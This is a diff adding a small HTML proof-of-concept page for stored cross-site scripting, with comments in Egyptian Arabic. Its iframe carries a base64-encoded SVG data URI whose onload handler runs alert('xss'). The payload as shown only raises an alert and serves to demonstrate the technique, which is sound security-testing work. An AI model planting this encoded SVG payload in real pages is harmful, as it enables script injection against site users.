@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Stored XSS POC</title>
+</head>
+<body>
+    <h1>POC Stored XSS</h1>
+    <p>لو شغلت الصفحة، هتشوف الـ alert:</p>
+
+    <!-- استخدم iframe لتشغيل JavaScript داخل SVG -->
+    <iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KPHN2Zw0KDQogb25sb2FkPSJhbGVydCgneHNzJykiDQogeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCjwvc3ZnPg==" 
+            width="400" height="200" style="border:none;"></iframe>
+</body>
+</html>
